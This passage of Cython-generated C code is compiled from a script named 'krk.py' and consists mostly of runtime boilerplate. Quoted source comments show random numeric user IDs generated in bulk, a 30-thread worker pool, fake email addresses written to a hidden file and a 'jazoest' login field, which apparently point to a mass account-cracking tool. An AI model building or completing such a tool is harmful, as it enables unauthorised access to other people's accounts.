  #define __Pyx_PyLong_Digits(x)  (((PyLongObject*)x)->long_value.ob_digit)
  #else
  #define __Pyx_PyLong_Digits(x)  (((PyLongObject*)x)->ob_digit)
  #endif
#endif
#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
static int __Pyx_sys_getdefaultencoding_not_ascii;
static int __Pyx_init_sys_getdefaultencoding_params(void) {
    PyObject* sys;
    PyObject* default_encoding = NULL;
    PyObject* ascii_chars_u = NULL;
    PyObject* ascii_chars_b = NULL;
    const char* default_encoding_c;
    sys = PyImport_ImportModule("sys");
    if (!sys) goto bad;
    default_encoding = PyObject_CallMethod(sys, (char*) "getdefaultencoding", NULL);
    Py_DECREF(sys);
    if (!default_encoding) goto bad;
    default_encoding_c = PyBytes_AsString(default_encoding);
    if (!default_encoding_c) goto bad;
    if (strcmp(default_encoding_c, "ascii") == 0) {
        __Pyx_sys_getdefaultencoding_not_ascii = 0;
    } else {
        char ascii_chars[128];
        int c;
        for (c = 0; c < 128; c++) {
            ascii_chars[c] = (char) c;
        }
        __Pyx_sys_getdefaultencoding_not_ascii = 1;
        ascii_chars_u = PyUnicode_DecodeASCII(ascii_chars, 128, NULL);
        if (!ascii_chars_u) goto bad;
        ascii_chars_b = PyUnicode_AsEncodedString(ascii_chars_u, default_encoding_c, NULL);
        if (!ascii_chars_b || !PyBytes_Check(ascii_chars_b) || memcmp(ascii_chars, PyBytes_AS_STRING(ascii_chars_b), 128) != 0) {
            PyErr_Format(
                PyExc_ValueError,
                "This module compiled with c_string_encoding=ascii, but default encoding '%.200s' is not a superset of ascii.",
                default_encoding_c);
            goto bad;
        }
        Py_DECREF(ascii_chars_u);
        Py_DECREF(ascii_chars_b);
    }
    Py_DECREF(default_encoding);
    return 0;
bad:
    Py_XDECREF(default_encoding);
    Py_XDECREF(ascii_chars_u);
    Py_XDECREF(ascii_chars_b);
    return -1;
}
#endif
#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT && PY_MAJOR_VERSION >= 3
#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_DecodeUTF8(c_str, size, NULL)
#else
#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_Decode(c_str, size, __PYX_DEFAULT_STRING_ENCODING, NULL)
#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
static char* __PYX_DEFAULT_STRING_ENCODING;
static int __Pyx_init_sys_getdefaultencoding_params(void) {
    PyObject* sys;
    PyObject* default_encoding = NULL;
    char* default_encoding_c;
    sys = PyImport_ImportModule("sys");
    if (!sys) goto bad;
    default_encoding = PyObject_CallMethod(sys, (char*) (const char*) "getdefaultencoding", NULL);
    Py_DECREF(sys);
    if (!default_encoding) goto bad;
    default_encoding_c = PyBytes_AsString(default_encoding);
    if (!default_encoding_c) goto bad;
    __PYX_DEFAULT_STRING_ENCODING = (char*) malloc(strlen(default_encoding_c) + 1);
    if (!__PYX_DEFAULT_STRING_ENCODING) goto bad;
    strcpy(__PYX_DEFAULT_STRING_ENCODING, default_encoding_c);
    Py_DECREF(default_encoding);
    return 0;
bad:
    Py_XDECREF(default_encoding);
    return -1;
}
#endif
#endif


/* Test for GCC > 2.95 */
#if defined(__GNUC__)     && (__GNUC__ > 2 || (__GNUC__ == 2 && (__GNUC_MINOR__ > 95)))
  #define likely(x)   __builtin_expect(!!(x), 1)
  #define unlikely(x) __builtin_expect(!!(x), 0)
#else /* !__GNUC__ or GCC < 2.95 */
  #define likely(x)   (x)
  #define unlikely(x) (x)
#endif /* __GNUC__ */
static CYTHON_INLINE void __Pyx_pretend_to_initialize(void* ptr) { (void)ptr; }

#if !CYTHON_USE_MODULE_STATE
static PyObject *__pyx_m = NULL;
#endif
static int __pyx_lineno;
static int __pyx_clineno = 0;
static const char * __pyx_cfilenm = __FILE__;
static const char *__pyx_filename;

/* #### Code section: filename_table ### */

static const char *__pyx_f[] = {
  "krk.py",
};
/* #### Code section: utility_code_proto_before_types ### */
/* #### Code section: numeric_typedefs ### */
/* #### Code section: complex_type_declarations ### */
/* #### Code section: type_declarations ### */

/*--- Type declarations ---*/
struct __pyx_obj_3krk___pyx_scope_struct__genexpr;
struct __pyx_obj_3krk___pyx_scope_struct_1_genexpr;
struct __pyx_obj_3krk___pyx_scope_struct_2_genexpr;
struct __pyx_obj_3krk___pyx_scope_struct_3_genexpr;
struct __pyx_obj_3krk___pyx_scope_struct_4_genexpr;
struct __pyx_obj_3krk___pyx_scope_struct_5_genexpr;
struct __pyx_obj_3krk___pyx_scope_struct_6_genexpr;

/* "krk.py":239
 *                         limit = 5000
 *                 for nmbr in range(limit):
 *                         nmp = ''.join(random.choice(string.digits) for _ in range(7))             # <<<<<<<<<<<<<<
 *                         user.append(nmp)
 *                 with tred(max_workers=30) as Sabir:
 */
struct __pyx_obj_3krk___pyx_scope_struct__genexpr {
  PyObject_HEAD
  long __pyx_v__;
  long __pyx_t_0;
};


/* "krk.py":269
 *                         limit = 5000
 *                 for nmbr in range(limit):
 *                         nmp = ''.join(random.choice(string.digits) for _ in range(8))             # <<<<<<<<<<<<<<
 *                         user.append(nmp)
 *                 with tred(max_workers=30) as Sabir:
 */
struct __pyx_obj_3krk___pyx_scope_struct_1_genexpr {
  PyObject_HEAD
  long __pyx_v__;
  long __pyx_t_0;
};


/* "krk.py":314
 *                         lchoice = random.choice(lists)
 *                         if '3' in lchoice:
 *                                 mail = ''.join(random.choice(string.digits) for _ in range(3))             # <<<<<<<<<<<<<<
 *                                 open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
 *                         else:
 */
struct __pyx_obj_3krk___pyx_scope_struct_2_genexpr {
  PyObject_HEAD
  long __pyx_v__;
  long __pyx_t_0;
};


/* "krk.py":317
 *                                 open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
 *                         else:
 *                                 mail = ''.join(random.choice(string.digits) for _ in range(4))             # <<<<<<<<<<<<<<
 *                                 open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
 *                         fo = open('.re.txt', 'r').read().splitlines()
 */
struct __pyx_obj_3krk___pyx_scope_struct_3_genexpr {
  PyObject_HEAD
  long __pyx_v__;
  long __pyx_t_0;
};


/* "krk.py":422
 *                         li = ['28','29','210']
 *                         li2 = random.choice(li)
 *                         j1 = ''.join(random.choice(digits) for _ in range(2))             # <<<<<<<<<<<<<<
 *                         jazoest = li2+j1
 *                         data = {
 */
struct __pyx_obj_3krk___pyx_scope_struct_4_genexpr {
  PyObject_HEAD
  long __pyx_v__;
  long __pyx_t_0;
};


/* "krk.py":528
 *                         li = ['28','29','210']
 *                         li2 = random.choice(li)
 *                         j1 = ''.join(random.choice(digits) for _ in range(2))             # <<<<<<<<<<<<<<
 *                         jazoest = li2+j1
 *                         data = {
 */
struct __pyx_obj_3krk___pyx_scope_struct_5_genexpr {
  PyObject_HEAD
  long __pyx_v__;
  long __pyx_t_0;
};


/* "krk.py":619
 *                         li = ['28','29','210']
 *                         li2 = random.choice(li)
 *                         j1 = ''.join(random.choice(digits) for _ in range(2))             # <<<<<<<<<<<<<<
 *                         jazoest = li2+j1
 *                         data = {
 */
struct __pyx_obj_3krk___pyx_scope_struct_6_genexpr {
  PyObject_HEAD
  long __pyx_v__;
  long __pyx_t_0;
};

/* #### Code section: utility_code_proto ### */

/* --- Runtime support code (head) --- */
/* Refnanny.proto */
#ifndef CYTHON_REFNANNY
  #define CYTHON_REFNANNY 0
#endif
#if CYTHON_REFNANNY
  typedef struct {
    void (*INCREF)(void*, PyObject*, Py_ssize_t);
    void (*DECREF)(void*, PyObject*, Py_ssize_t);
    void (*GOTREF)(void*, PyObject*, Py_ssize_t);
    void (*GIVEREF)(void*, PyObject*, Py_ssize_t);
    void* (*SetupContext)(const char*, Py_ssize_t, const char*);
    void (*FinishContext)(void**);
  } __Pyx_RefNannyAPIStruct;
  static __Pyx_RefNannyAPIStruct *__Pyx_RefNanny = NULL;
  static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname);
  #define __Pyx_RefNannyDeclarations void *__pyx_refnanny = NULL;
#ifdef WITH_THREAD
  #define __Pyx_RefNannySetupContext(name, acquire_gil)\
          if (acquire_gil) {\
              PyGILState_STATE __pyx_gilstate_save = PyGILState_Ensure();\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), (__LINE__), (__FILE__));\
              PyGILState_Release(__pyx_gilstate_save);\
          } else {\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), (__LINE__), (__FILE__));\
          }
  #define __Pyx_RefNannyFinishContextNogil() {\
              PyGILState_STATE __pyx_gilstate_save = PyGILState_Ensure();\
              __Pyx_RefNannyFinishContext();\
              PyGILState_Release(__pyx_gilstate_save);\
          }
#else
  #define __Pyx_RefNannySetupContext(name, acquire_gil)\
          __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), (__LINE__), (__FILE__))
  #define __Pyx_RefNannyFinishContextNogil() __Pyx_RefNannyFinishContext()
#endif
  #define __Pyx_RefNannyFinishContextNogil() {\
              PyGILState_STATE __pyx_gilstate_save = PyGILState_Ensure();\
              __Pyx_RefNannyFinishContext();\
              PyGILState_Release(__pyx_gilstate_save);\
          }
  #define __Pyx_RefNannyFinishContext()\
          __Pyx_RefNanny->FinishContext(&__pyx_refnanny)
  #define __Pyx_INCREF(r)  __Pyx_RefNanny->INCREF(__pyx_refnanny, (PyObject *)(r), (__LINE__))
  #define __Pyx_DECREF(r)  __Pyx_RefNanny->DECREF(__pyx_refnanny, (PyObject *)(r), (__LINE__))
  #define __Pyx_GOTREF(r)  __Pyx_RefNanny->GOTREF(__pyx_refnanny, (PyObject *)(r), (__LINE__))
  #define __Pyx_GIVEREF(r) __Pyx_RefNanny->GIVEREF(__pyx_refnanny, (PyObject *)(r), (__LINE__))
  #define __Pyx_XINCREF(r)  do { if((r) == NULL); else {__Pyx_INCREF(r); }} while(0)
  #define __Pyx_XDECREF(r)  do { if((r) == NULL); else {__Pyx_DECREF(r); }} while(0)
  #define __Pyx_XGOTREF(r)  do { if((r) == NULL); else {__Pyx_GOTREF(r); }} while(0)
  #define __Pyx_XGIVEREF(r) do { if((r) == NULL); else {__Pyx_GIVEREF(r);}} while(0)
#else
  #define __Pyx_RefNannyDeclarations
  #define __Pyx_RefNannySetupContext(name, acquire_gil)
  #define __Pyx_RefNannyFinishContextNogil()
  #define __Pyx_RefNannyFinishContext()
  #define __Pyx_INCREF(r) Py_INCREF(r)
  #define __Pyx_DECREF(r) Py_DECREF(r)
  #define __Pyx_GOTREF(r)
  #define __Pyx_GIVEREF(r)
  #define __Pyx_XINCREF(r) Py_XINCREF(r)
  #define __Pyx_XDECREF(r) Py_XDECREF(r)
  #define __Pyx_XGOTREF(r)
  #define __Pyx_XGIVEREF(r)
#endif
#define __Pyx_Py_XDECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; Py_XDECREF(tmp);\
    } while (0)
#define __Pyx_XDECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_XDECREF(tmp);\
    } while (0)
#define __Pyx_DECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_DECREF(tmp);\
    } while (0)
#define __Pyx_CLEAR(r)    do { PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);} while(0)
#define __Pyx_XCLEAR(r)   do { if((r) != NULL) {PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);}} while(0)

/* PyErrExceptionMatches.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyErr_ExceptionMatches(err) __Pyx_PyErr_ExceptionMatchesInState(__pyx_tstate, err)
static CYTHON_INLINE int __Pyx_PyErr_ExceptionMatchesInState(PyThreadState* tstate, PyObject* err);
#else
#define __Pyx_PyErr_ExceptionMatches(err)  PyErr_ExceptionMatches(err)
#endif

/* PyThreadStateGet.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyThreadState_declare  PyThreadState *__pyx_tstate;
#define __Pyx_PyThreadState_assign  __pyx_tstate = __Pyx_PyThreadState_Current;
#if PY_VERSION_HEX >= 0x030C00A6
#define __Pyx_PyErr_Occurred()  (__pyx_tstate->current_exception != NULL)
#define __Pyx_PyErr_CurrentExceptionType()  (__pyx_tstate->current_exception ? (PyObject*) Py_TYPE(__pyx_tstate->current_exception) : (PyObject*) NULL)
#else
#define __Pyx_PyErr_Occurred()  (__pyx_tstate->curexc_type != NULL)
#define __Pyx_PyErr_CurrentExceptionType()  (__pyx_tstate->curexc_type)
#endif
#else
#define __Pyx_PyThreadState_declare
#define __Pyx_PyThreadState_assign
#define __Pyx_PyErr_Occurred()  (PyErr_Occurred() != NULL)
#define __Pyx_PyErr_CurrentExceptionType()  PyErr_Occurred()
#endif

/* PyErrFetchRestore.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyErr_Clear() __Pyx_ErrRestore(NULL, NULL, NULL)
#define __Pyx_ErrRestoreWithState(type, value, tb)  __Pyx_ErrRestoreInState(PyThreadState_GET(), type, value, tb)
#define __Pyx_ErrFetchWithState(type, value, tb)    __Pyx_ErrFetchInState(PyThreadState_GET(), type, value, tb)
#define __Pyx_ErrRestore(type, value, tb)  __Pyx_ErrRestoreInState(__pyx_tstate, type, value, tb)
#define __Pyx_ErrFetch(type, value, tb)    __Pyx_ErrFetchInState(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX < 0x030C00A6
#define __Pyx_PyErr_SetNone(exc) (Py_INCREF(exc), __Pyx_ErrRestore((exc), NULL, NULL))
#else
#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)
#endif
#else
#define __Pyx_PyErr_Clear() PyErr_Clear()
#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)
#define __Pyx_ErrRestoreWithState(type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetchWithState(type, value, tb)  PyErr_Fetch(type, value, tb)
#define __Pyx_ErrRestoreInState(tstate, type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetchInState(tstate, type, value, tb)  PyErr_Fetch(type, value, tb)
#define __Pyx_ErrRestore(type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetch(type, value, tb)  PyErr_Fetch(type, value, tb)
#endif

/* PyObjectGetAttrStr.proto */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name);
#else
#define __Pyx_PyObject_GetAttrStr(o,n) PyObject_GetAttr(o,n)
#endif

/* PyObjectGetAttrStrNoError.proto */
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStrNoError(PyObject* obj, PyObject* attr_name);

/* GetBuiltinName.proto */
static PyObject *__Pyx_GetBuiltinName(PyObject *name);

/* TupleAndListFromArray.proto */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyList_FromArray(PyObject *const *src, Py_ssize_t n);
static CYTHON_INLINE PyObject* __Pyx_PyTuple_FromArray(PyObject *const *src, Py_ssize_t n);
#endif

/* IncludeStringH.proto */
#include <string.h>

/* BytesEquals.proto */
static CYTHON_INLINE int __Pyx_PyBytes_Equals(PyObject* s1, PyObject* s2, int equals);

/* UnicodeEquals.proto */
static CYTHON_INLINE int __Pyx_PyUnicode_Equals(PyObject* s1, PyObject* s2, int equals);

/* fastcall.proto */
#define __Pyx_Arg_VARARGS(args, i) PyTuple_GET_ITEM(args, i)
#define __Pyx_NumKwargs_VARARGS(kwds) PyDict_Size(kwds)
#define __Pyx_KwValues_VARARGS(args, nargs) NULL
#define __Pyx_GetKwValue_VARARGS(kw, kwvalues, s) __Pyx_PyDict_GetItemStrWithError(kw, s)
#define __Pyx_KwargsAsDict_VARARGS(kw, kwvalues) PyDict_Copy(kw)
#if CYTHON_METH_FASTCALL
    #define __Pyx_Arg_FASTCALL(args, i) args[i]
    #define __Pyx_NumKwargs_FASTCALL(kwds) PyTuple_GET_SIZE(kwds)
    #define __Pyx_KwValues_FASTCALL(args, nargs) ((args) + (nargs))
    static CYTHON_INLINE PyObject * __Pyx_GetKwValue_FASTCALL(PyObject *kwnames, PyObject *const *kwvalues, PyObject *s);
    #define __Pyx_KwargsAsDict_FASTCALL(kw, kwvalues) _PyStack_AsDict(kwvalues, kw)
#else
    #define __Pyx_Arg_FASTCALL __Pyx_Arg_VARARGS
    #define __Pyx_NumKwargs_FASTCALL __Pyx_NumKwargs_VARARGS
    #define __Pyx_KwValues_FASTCALL __Pyx_KwValues_VARARGS
    #define __Pyx_GetKwValue_FASTCALL __Pyx_GetKwValue_VARARGS
    #define __Pyx_KwargsAsDict_FASTCALL __Pyx_KwargsAsDict_VARARGS
#endif
#if CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_ArgsSlice_VARARGS(args, start, stop) __Pyx_PyTuple_FromArray(&__Pyx_Arg_VARARGS(args, start), stop - start)
#define __Pyx_ArgsSlice_FASTCALL(args, start, stop) __Pyx_PyTuple_FromArray(&__Pyx_Arg_FASTCALL(args, start), stop - start)
#else
#define __Pyx_ArgsSlice_VARARGS(args, start, stop) PyTuple_GetSlice(args, start, stop)
#define __Pyx_ArgsSlice_FASTCALL(args, start, stop) PyTuple_GetSlice(args, start, stop)
#endif

/* PyObjectCall.proto */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw);
#else
#define __Pyx_PyObject_Call(func, arg, kw) PyObject_Call(func, arg, kw)
#endif

/* PyDictVersioning.proto */
#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
#define __PYX_DICT_VERSION_INIT  ((PY_UINT64_T) -1)
#define __PYX_GET_DICT_VERSION(dict)  (((PyDictObject*)(dict))->ma_version_tag)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)\
    (version_var) = __PYX_GET_DICT_VERSION(dict);\
    (cache_var) = (value);
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP) {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    if (likely(__PYX_GET_DICT_VERSION(DICT) == __pyx_dict_version)) {\
        (VAR) = __pyx_dict_cached_value;\
    } else {\
        (VAR) = __pyx_dict_cached_value = (LOOKUP);\
        __pyx_dict_version = __PYX_GET_DICT_VERSION(DICT);\
    }\
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj);
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj);
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version);
#else
#define __PYX_GET_DICT_VERSION(dict)  (0)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP)  (VAR) = (LOOKUP);
#endif

/* GetModuleGlobalName.proto */
#if CYTHON_USE_DICT_VERSIONS
#define __Pyx_GetModuleGlobalName(var, name)  do {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    (var) = (likely(__pyx_dict_version == __PYX_GET_DICT_VERSION(__pyx_d))) ?\
        (likely(__pyx_dict_cached_value) ? __Pyx_NewRef(__pyx_dict_cached_value) : __Pyx_GetBuiltinName(name)) :\
        __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
} while(0)
#define __Pyx_GetModuleGlobalNameUncached(var, name)  do {\
    PY_UINT64_T __pyx_dict_version;\
    PyObject *__pyx_dict_cached_value;\
    (var) = __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
} while(0)
static PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value);
#else
#define __Pyx_GetModuleGlobalName(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
#define __Pyx_GetModuleGlobalNameUncached(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
static CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name);
#endif

/* PyFunctionFastCall.proto */
#if CYTHON_FAST_PYCALL
#if !CYTHON_VECTORCALL
#define __Pyx_PyFunction_FastCall(func, args, nargs)\
    __Pyx_PyFunction_FastCallDict((func), (args), (nargs), NULL)
static PyObject *__Pyx_PyFunction_FastCallDict(PyObject *func, PyObject **args, Py_ssize_t nargs, PyObject *kwargs);
#endif
#define __Pyx_BUILD_ASSERT_EXPR(cond)\
    (sizeof(char [1 - 2*!(cond)]) - 1)
#ifndef Py_MEMBER_SIZE
#define Py_MEMBER_SIZE(type, member) sizeof(((type *)0)->member)
#endif
#if !CYTHON_VECTORCALL
#if PY_VERSION_HEX >= 0x03080000
  #include "frameobject.h"
#if PY_VERSION_HEX >= 0x030b00a6
  #ifndef Py_BUILD_CORE
    #define Py_BUILD_CORE 1
  #endif
  #include "internal/pycore_frame.h"
#endif
  #define __Pxy_PyFrame_Initialize_Offsets()
  #define __Pyx_PyFrame_GetLocalsplus(frame)  ((frame)->f_localsplus)
#else
  static size_t __pyx_pyframe_localsplus_offset = 0;
  #include "frameobject.h"
  #define __Pxy_PyFrame_Initialize_Offsets()\
    ((void)__Pyx_BUILD_ASSERT_EXPR(sizeof(PyFrameObject) == offsetof(PyFrameObject, f_localsplus) + Py_MEMBER_SIZE(PyFrameObject, f_localsplus)),\
     (void)(__pyx_pyframe_localsplus_offset = ((size_t)PyFrame_Type.tp_basicsize) - Py_MEMBER_SIZE(PyFrameObject, f_localsplus)))
  #define __Pyx_PyFrame_GetLocalsplus(frame)\
    (assert(__pyx_pyframe_localsplus_offset), (PyObject **)(((char *)(frame)) + __pyx_pyframe_localsplus_offset))
#endif
#endif
#endif

/* PyObjectCallMethO.proto */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject *func, PyObject *arg);
#endif

/* PyObjectFastCall.proto */
#define __Pyx_PyObject_FastCall(func, args, nargs)  __Pyx_PyObject_FastCallDict(func, args, (size_t)(nargs), NULL)
static CYTHON_INLINE PyObject* __Pyx_PyObject_FastCallDict(PyObject *func, PyObject **args, size_t nargs, PyObject *kwargs);

/* PyObjectCallOneArg.proto */
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg);

/* StrEquals.proto */
#if PY_MAJOR_VERSION >= 3
#define __Pyx_PyString_Equals __Pyx_PyUnicode_Equals
#else
#define __Pyx_PyString_Equals __Pyx_PyBytes_Equals
#endif

/* GetTopmostException.proto */
#if CYTHON_USE_EXC_INFO_STACK && CYTHON_FAST_THREAD_STATE
static _PyErr_StackItem * __Pyx_PyErr_GetTopmostException(PyThreadState *tstate);
#endif

/* SaveResetException.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_ExceptionSave(type, value, tb)  __Pyx__ExceptionSave(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx__ExceptionSave(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#define __Pyx_ExceptionReset(type, value, tb)  __Pyx__ExceptionReset(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx__ExceptionReset(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);
#else
#define __Pyx_ExceptionSave(type, value, tb)   PyErr_GetExcInfo(type, value, tb)
#define __Pyx_ExceptionReset(type, value, tb)  PyErr_SetExcInfo(type, value, tb)
#endif

/* FastTypeChecks.proto */
#if CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_TypeCheck(obj, type) __Pyx_IsSubtype(Py_TYPE(obj), (PyTypeObject *)type)
#define __Pyx_TypeCheck2(obj, type1, type2) __Pyx_IsAnySubtype2(Py_TYPE(obj), (PyTypeObject *)type1, (PyTypeObject *)type2)
static CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b);
static CYTHON_INLINE int __Pyx_IsAnySubtype2(PyTypeObject *cls, PyTypeObject *a, PyTypeObject *b);
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject *type);
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *type1, PyObject *type2);
#else
#define __Pyx_TypeCheck(obj, type) PyObject_TypeCheck(obj, (PyTypeObject *)type)
#define __Pyx_TypeCheck2(obj, type1, type2) (PyObject_TypeCheck(obj, (PyTypeObject *)type1) || PyObject_TypeCheck(obj, (PyTypeObject *)type2))
#define __Pyx_PyErr_GivenExceptionMatches(err, type) PyErr_GivenExceptionMatches(err, type)
#define __Pyx_PyErr_GivenExceptionMatches2(err, type1, type2) (PyErr_GivenExceptionMatches(err, type1) || PyErr_GivenExceptionMatches(err, type2))
#endif
#define __Pyx_PyErr_ExceptionMatches2(err1, err2)  __Pyx_PyErr_GivenExceptionMatches2(__Pyx_PyErr_CurrentExceptionType(), err1, err2)
#define __Pyx_PyException_Check(obj) __Pyx_TypeCheck(obj, PyExc_Exception)

/* GetException.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_GetException(type, value, tb)  __Pyx__GetException(__pyx_tstate, type, value, tb)
static int __Pyx__GetException(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#else
static int __Pyx_GetException(PyObject **type, PyObject **value, PyObject **tb);
#endif

/* ListAppend.proto */
#if CYTHON_USE_PYLIST_INTERNALS && CYTHON_ASSUME_SAFE_MACROS
static CYTHON_INLINE int __Pyx_PyList_Append(PyObject* list, PyObject* x) {
    PyListObject* L = (PyListObject*) list;
    Py_ssize_t len = Py_SIZE(list);
    if (likely(L->allocated > len) & likely(len > (L->allocated >> 1))) {
        Py_INCREF(x);
        PyList_SET_ITEM(list, len, x);
        __Pyx_SET_SIZE(list, len + 1);
        return 0;
    }
    return PyList_Append(list, x);
}
#else
#define __Pyx_PyList_Append(L,x) PyList_Append(L,x)
#endif

/* PyIntBinop.proto */
#if !CYTHON_COMPILING_IN_PYPY
static PyObject* __Pyx_PyInt_AddObjC(PyObject *op1, PyObject *op2, long intval, int inplace, int zerodivision_check);
#else
#define __Pyx_PyInt_AddObjC(op1, op2, intval, inplace, zerodivision_check)\
    (inplace ? PyNumber_InPlaceAdd(op1, op2) : PyNumber_Add(op1, op2))
#endif

/* PyObjectFormatSimple.proto */
#if CYTHON_COMPILING_IN_PYPY
    #define __Pyx_PyObject_FormatSimple(s, f) (\
        likely(PyUnicode_CheckExact(s)) ? (Py_INCREF(s), s) :\
        PyObject_Format(s, f))
#elif PY_MAJOR_VERSION < 3
    #define __Pyx_PyObject_FormatSimple(s, f) (\
        likely(PyUnicode_CheckExact(s)) ? (Py_INCREF(s), s) :\
        likely(PyString_CheckExact(s)) ? PyUnicode_FromEncodedObject(s, NULL, "strict") :\
        PyObject_Format(s, f))
#elif CYTHON_USE_TYPE_SLOTS
    #define __Pyx_PyObject_FormatSimple(s, f) (\
        likely(PyUnicode_CheckExact(s)) ? (Py_INCREF(s), s) :\
        likely(PyLong_CheckExact(s)) ? PyLong_Type.tp_repr(s) :\
        likely(PyFloat_CheckExact(s)) ? PyFloat_Type.tp_repr(s) :\
        PyObject_Format(s, f))
#else
    #define __Pyx_PyObject_FormatSimple(s, f) (\
        likely(PyUnicode_CheckExact(s)) ? (Py_INCREF(s), s) :\
        PyObject_Format(s, f))
#endif

/* JoinPyUnicode.proto */
static PyObject* __Pyx_PyUnicode_Join(PyObject* value_tuple, Py_ssize_t value_count, Py_ssize_t result_ulength,
                                      Py_UCS4 max_char);

/* PyObjectCall2Args.proto */
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call2Args(PyObject* function, PyObject* arg1, PyObject* arg2);

/* PyObjectGetMethod.proto */
static int __Pyx_PyObject_GetMethod(PyObject *obj, PyObject *name, PyObject **method);

/* PyObjectCallMethod1.proto */
static PyObject* __Pyx_PyObject_CallMethod1(PyObject* obj, PyObject* method_name, PyObject* arg);

/* append.proto */
static CYTHON_INLINE int __Pyx_PyObject_Append(PyObject* L, PyObject* x);

/* PyObjectLookupSpecial.proto */
#if CYTHON_USE_PYTYPE_LOOKUP && CYTHON_USE_TYPE_SLOTS
#define __Pyx_PyObject_LookupSpecialNoError(obj, attr_name)  __Pyx__PyObject_LookupSpecial(obj, attr_name, 0)
#define __Pyx_PyObject_LookupSpecial(obj, attr_name)  __Pyx__PyObject_LookupSpecial(obj, attr_name, 1)
static CYTHON_INLINE PyObject* __Pyx__PyObject_LookupSpecial(PyObject* obj, PyObject* attr_name, int with_error);
#else
#define __Pyx_PyObject_LookupSpecialNoError(o,n) __Pyx_PyObject_GetAttrStrNoError(o,n)
#define __Pyx_PyObject_LookupSpecial(o,n) __Pyx_PyObject_GetAttrStr(o,n)
#endif

/* PyObject_Str.proto */
#define __Pyx_PyObject_Str(obj)\
    (likely(PyString_CheckExact(obj)) ? __Pyx_NewRef(obj) : PyObject_Str(obj))

/* RaiseUnboundLocalError.proto */
